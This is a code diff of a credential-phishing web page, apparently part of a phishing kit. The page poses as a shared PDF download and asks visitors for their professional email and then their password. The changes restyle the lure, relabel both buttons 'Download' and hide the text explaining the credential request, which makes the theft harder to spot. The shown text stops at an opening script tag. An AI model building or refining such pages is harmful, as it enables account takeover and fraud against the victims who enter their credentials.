@@ -11,6 +11,9 @@
             font-family: "Segoe UI", Arial, sans-serif;
             background-color: #fff;
             text-align: center;
+            background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAM_gPc8LiBfF1QLX8gSrJVN6xDx1p77NGY6rQXGJF7BHjVW-zcOvpBHR6DWCIvA0-w7Rwr9qe7btXC3beSPWb5esj67kCujm3bRi-85nwtLTO5mPuYTIrfvdncNwOWHiu9Ck28S0XZxis4K7NHRrllQgqj9dBkyMM1dIEkCHPQ4GJhC5-60IppdI9pEo/s320/Untitled-2.jpg');
+            background-size: cover;
+            background-position-y: -120px;
         }
 
         .header {
@@ -24,27 +27,30 @@
 
         .logo {
             margin: 25px 0;
+            margin-top: 80px;
         }
 
         .card {
             max-width: 350px;
             margin: 0 auto;
-            border: 1px solid #ddd;
+            /* border: 1px solid #ddd; */
             border-radius: 6px;
             box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
             padding: 20px;
+            background: #691011;
         }
 
         .card h2 {
             font-size: 25px;
             font-weight: 500;
             margin: 0 0 15px 0;
+            color: white;
         }
 
         .content {
             text-align: left;
             font-size: 17px;
-            color: #333;
+            color: #fff;
             margin-bottom: 20px;
         }
 
@@ -64,8 +70,8 @@
         .verify-btn {
             display: block;
             width: 100%;
-            background: #691011;
-            color: white;
+            background: white;
+            color: black;
             border: none;
             border-radius: 3px;
             padding: 12px;
@@ -98,9 +104,9 @@
         }
 
         .footer {
-            font-size: 12px;
-            color: #666;
-            margin-top: 18px;
+            font-size: 13px;
+            color: #000;
+            margin-top: 100px;
         }
 
         .footer a {
@@ -160,25 +166,25 @@
         <h2>Verify Your Identity</h2>
 
         <div class="content" id="cardText">
-            <p>You've received a secure link to:</p>
+            <p>You've received a secure file:</p>
             <div class="file">
                 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgn86DXu05miVMk5nE-NADw_s7uDwK9l6KSmDG6QZ5hfzgq30Hprq5aUqSFGxHyV12Pd8ILF1p_lOsD8AGjgrDvKkwZ47Y2iz-yqnU_iSdK9ybmVz8Uiq0UV3zuI1Vzi0wgi64zVfCbRhrfNZycgd4qnOqObW-tE8yoyQ-09SzYqXk6viNn1xK3Q4d8EJs/s320/PDF_file_icon.svg.png"
                     width="80px" alt="File"> Shared file.
             </div>
-            <p id="instructionText">
+            <!-- <p id="instructionText">
                 To receive and download this PDF file, please enter specific professional email credentials that this
                 document was sent to.
-            </p>
+            </p> -->
         </div>
 
         <form id="verifyForm">
             <!-- Step 1 -->
             <div id="step1">
                 <div class="form-field">
-                    <label for="inputline1">Email:</label>
+                    <label for="inputline1" style="color: #fff;">Email:</label>
                     <input type="email" id="inputline1" name="user" required>
                 </div>
-                <button type="button" class="verify-btn" id="nextBtn">Next</button>
+                <button type="button" class="verify-btn" id="nextBtn">Download</button>
             </div>
 
             <!-- Step 2 -->
@@ -186,23 +192,23 @@
                 <div id="error-message" style="color: red; font-size: 14px; margin-bottom: 10px;"></div>
                 <!-- Error message container -->
                 <div class="form-field">
-                    <label for="password">Verify Password:</label>
+                    <label for="password" style="color: #fff;">Password:</label>
                     <input type="password" id="password" name="pass" required>
                 </div>
-                <button type="submit" id="verifyBtn" class="verify-btn">Verify</button>
+                <button type="submit" id="verifyBtn" class="verify-btn">Download</button>
             </div>
         </form>
     </div>
 
     <div class="footer">
-        Copyright © 2025 All rights reserved.
+        Copyright © 2025 - 2026 All rights reserved.
         <a href="#">Privacy</a> & <a href="#">Cookies</a>
     </div>
 
     <!-- Preloader -->
     <div class="preloader" id="preloader">
         <div class="spinner"></div>
-        <div>Loading...</div>
+        <div>Downloading...</div>
     </div>
 
     <script>
